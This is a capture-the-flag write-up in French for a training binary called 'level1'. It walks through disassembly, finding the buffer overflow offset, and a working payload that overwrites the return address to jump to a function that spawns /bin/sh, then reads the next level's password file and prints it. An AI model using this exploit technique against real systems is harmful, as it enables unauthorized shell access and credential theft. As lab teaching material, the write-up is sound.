# Level1

On observe un exécutable à la racine : `level1`

```shell
$ ./level1
Hello World

$ python -c 'print "A"*100' | ./level1
Segmentation fault (core dumped)
```

On cherche donc à comprendre ce que fait l'exécutable

```shell
$ gdb level1 -q
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:   push   ebp
   0x08048481 <+1>:   mov    ebp,esp
   0x08048483 <+3>:   and    esp,0xfffffff0
   0x08048486 <+6>:   sub    esp,0x50
   0x08048489 <+9>:   lea    eax,[esp+0x10]
   0x0804848d <+13>:  mov    DWORD PTR [esp],eax
   0x08048490 <+16>:  call   0x8048340 <gets@plt>
   0x08048495 <+21>:  leave
   0x08048496 <+22>:  ret
End of assembler dump.
```

On va utiliser `Cutter` pour avoir une idée plus claire de `level1`

```shell
$ scp -P 4242 -r level1@192.168.56.102:/home/user/level1/level1 .

$ ./Cutter-v2.1.2-Linux-x86_64.AppImage level1
```

_resultat sauvegardé dans [source.md](source.md)_

On remarque que `undefined auStack80 [76]` représente un buffer qui nous est alloué, on peut essayer de le remplir :

```shell
$ python -c 'print "A"*75' | ./level1

$ python -c 'print "A"*76' | ./level1
Illegal instruction (core dumped)

$ python -c 'print "A"*77' | ./level1
Illegal instruction (core dumped)

$ python -c 'print "A"*78' | ./level1
Segmentation fault (core dumped)
```

- `python -c 'print "A"*75'` est notre taille aloue maximum (75 + 1 = 76 caractères pour le `\n` automatique du print de python)

- De `77` à `80'`, on écrit par dessus l'EBP, de `81` à `84`, par dessus l'EIP

On remarque aussi, grace a `Cutter` qu'il y a une fonction `run` qui fait un appel a `/bin/sh`

```shell
run ();
0x08048444      push    ebp
0x08048445      mov     ebp, esp
0x08048447      sub     esp, 0x18
0x0804844a      mov     eax, dword [stdout]
0x0804844f      mov     edx, eax
0x08048451      mov     eax, str.Good..._Wait_what
0x08048456      mov     dword [stream], edx
0x0804845a      mov     dword [nitems], 0x13
0x08048462      mov     dword [size], 1
0x0804846a      mov     dword [esp], eax
0x0804846d      call    fwrite
0x08048472      mov     dword [esp], str.bin_sh
0x08048479      call    system
0x0804847e      leave
0x0804847f      ret

int main (int argc, char **argv, char **envp);
0x08048480      push    ebp
0x08048481      mov     ebp, esp
0x08048483      and     esp, 0xfffffff0
0x08048486      sub     esp, 0x50
0x08048489      lea     eax, [s]
0x0804848d      mov     dword [esp], eax
0x08048490      call    gets
0x08048495      leave
0x08048496      ret
0x08048497      nop
```

On a une porte d'entré, plus une clef. Plus qu'à les rassembler en remplaçant l'EIP (prochaine instruction) par l'addresse de `run`:

```shell
$ python -c 'print "A"*76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

_Hmm..._

Le programme se ferme avant que l'on ai le temps de faire quoi que ce soit.

Mais grace a `cat`, nous avons un moyen d'empêcher la fermeture de `level1`

```shell
$ (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
Ctrl+D
Segmentation fault (core dumped)
```

`https://beta.hackndo.com/buffer-overflow/`
